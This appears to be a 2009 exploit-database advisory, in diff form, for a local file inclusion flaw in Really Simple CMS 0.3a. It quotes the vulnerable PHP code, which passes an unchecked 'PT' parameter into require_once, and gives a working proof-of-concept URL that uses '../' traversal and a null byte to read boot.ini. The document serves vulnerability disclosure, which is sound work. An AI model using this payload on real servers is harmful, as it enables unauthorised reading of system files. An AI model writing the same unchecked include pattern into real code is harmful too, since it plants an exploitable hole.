@@ -1,0 +1,32 @@
+###########################################################################################
+[+] Really Simple CMS 0.3a (pagecontent.php PT) Local File Inclusion Vulnerability
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+############################################################################################
+
+[+] Download : http://sourceforge.net/projects/rscms/
+
+[+] Local File Inclusion
+
+ - Vulnerable code in plugings/pagecontent.php
+
+-----------------------------------
+if (!$PT) {
+	$PT = 'text';
+}
+$PTF = "plugings/";
+$PTF .= $PT;
+$PTF .= ".php";
+
+
+require_once($PTF);
+-----------------------------------
+
+ - PoC
+
+    http://127.0.0.1/[path]/plugings/pagecontent.php?PT=../../../../../../../boot.ini%00
+
+############################################################################################
+
+# milw0rm.com [2009-07-30]
